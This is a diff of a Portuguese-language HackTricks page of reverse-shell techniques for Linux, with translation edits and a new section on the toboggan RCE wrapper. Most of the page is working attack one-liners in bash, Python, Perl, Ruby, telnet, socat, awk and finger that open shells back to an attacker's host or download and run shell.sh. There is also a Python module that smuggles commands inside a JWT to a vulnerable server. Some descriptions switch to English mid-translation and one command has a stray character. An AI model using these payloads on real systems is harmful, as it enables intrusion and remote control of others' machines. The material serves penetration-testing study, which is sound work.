@@ -2,23 +2,23 @@
 
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking na AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-**Se você tiver dúvidas sobre algum desses shells, você pode verificá-los com** [**https://explainshell.com/**](https://explainshell.com)
+**Se você tiver dúvidas sobre algum desses shells, você pode verificá-los em** [**https://explainshell.com/**](https://explainshell.com)
 
 ## TTY Completo
 
-**Uma vez que você obtiver um shell reverso**[ **leia esta página para obter um TTY completo**](full-ttys.md)**.**
+**Depois de obter um shell reverso**[ **leia esta página para obter um TTY completo**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -57,19 +57,52 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
-## Shell Avançado
+## Shell Reverso
 
-Se você encontrar uma **vulnerabilidade RCE** em um aplicativo da web baseado em Linux, pode haver casos em que **obter um shell reverso se torne difícil** devido à presença de regras Iptables ou outros filtros. Em tais cenários, considere criar um shell PTY dentro do sistema comprometido usando pipes.
+Ao lidar com uma vulnerabilidade de **Execução de Código Remoto (RCE)** em uma aplicação web baseada em Linux, a obtenção de um shell reverso pode ser obstruída por defesas de rede como regras iptables ou mecanismos complexos de filtragem de pacotes. Em ambientes restritos como esse, uma abordagem alternativa envolve o estabelecimento de um shell PTY (Pseudo Terminal) para interagir com o sistema comprometido de forma mais eficaz.
 
-Você pode encontrar o código em [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
+Uma ferramenta recomendada para esse fim é o [toboggan](https://github.com/n3rada/toboggan.git), que simplifica a interação com o ambiente alvo.
+
+Para utilizar o toboggan de forma eficaz, crie um módulo Python adaptado ao contexto de RCE do seu sistema alvo. Por exemplo, um módulo chamado `nix.py` poderia ser estruturado da seguinte forma:
+```python3
+import jwt
+import httpx
+
+def execute(command: str, timeout: float = None) -> str:
+# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
+token = jwt.encode(
+{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
+)
+
+response = httpx.get(
+url="https://vulnerable.io:3200",
+headers={"Authorization": f"Bearer {token}"},
+timeout=timeout,
+# ||BURP||
+verify=False,
+)
+
+# Check if the request was successful
+response.raise_for_status()
+
+return response.text
+```
+E então, você pode executar:
+```shell
+toboggan -m nix.py -i
+```
+Para alavancar diretamente um shell interativo. Você pode adicionar `-b` para integração com o Burpsuite e remover o `-i` para um invólucro rce mais básico.
+
+
+Outra possibilidade consiste em usar a implementação de shell avançado `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Você só precisa modificar:
 
 * A URL do host vulnerável
-* O prefixo e sufixo de sua carga útil (se houver)
+* O prefixo e sufixo da sua carga útil (se houver)
 * A forma como a carga útil é enviada (cabeçalhos? dados? informações extras?)
 
-Então, você pode simplesmente **enviar comandos** ou até mesmo **usar o comando `upgrade`** para obter um PTY completo (observe que os pipes são lidos e escritos com um atraso aproximado de 1,3s).
+Então, você pode apenas **enviar comandos** ou até mesmo **usar o comando `upgrade`** para obter um PTY completo (observe que os pipes são lidos e escritos com um atraso aproximado de 1,3s).
 
 ## Netcat
 ```bash
@@ -87,7 +120,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet é um protocolo de rede que permite a comunicação remota com um dispositivo usando um prompt de comando. É comumente usado para acessar e gerenciar dispositivos de rede.
+Telnet é um protocolo de rede que permite a comunicação bidirecional de texto em uma rede ou internet. É comumente usado para acessar remotamente servidores, roteadores e outros dispositivos de rede para fins de administração.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -116,14 +149,14 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl é uma linguagem de programação versátil e poderosa que é frequentemente usada para escrever scripts de shell. Com sua sintaxe flexível e recursos avançados, o Perl é uma escolha popular para tarefas de automação e manipulação de texto no Linux.
+Perl is a high-level, general-purpose, interpreted programming language known for its flexibility and powerful text processing capabilities. It is commonly used for system administration tasks, web development, and network programming. Perl scripts can be used to create powerful one-liners for various tasks, making it a popular choice for hackers and system administrators alike.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-Ruby is a dynamic, open source programming language with a focus on simplicity and productivity. It has an elegant syntax that is easy to read and write. Ruby is often used for web development and is known for its Rails framework, which makes building web applications faster and easier.
+Ruby is a dynamic, open source programming language with a focus on simplicity and productivity. It has an elegant syntax that is easy to read and write. Ruby is commonly used for web development and is known for its Rails framework, which makes building web applications faster and easier.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -236,6 +269,8 @@ attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
+
+Awk é uma ferramenta de manipulação de texto muito poderosa e versátil no Linux. É comumente usada para processar e extrair dados de arquivos de texto de forma eficiente. Awk opera linha por linha e permite que você defina padrões e ações para processar os dados de acordo com esses padrões. É uma ferramenta essencial para qualquer hacker ou administrador de sistemas que precise lidar com análise de dados e automação de tarefas.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -254,6 +289,8 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; s
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
 ```
 ## Gawk
+
+Gawk é uma versão do Awk que é amplamente utilizada para processamento de texto e criação de scripts. É uma ferramenta poderosa para manipulação de dados estruturados e pode ser usada para automatizar tarefas repetitivas no Linux.
 ```bash
 #!/usr/bin/gawk -f
 
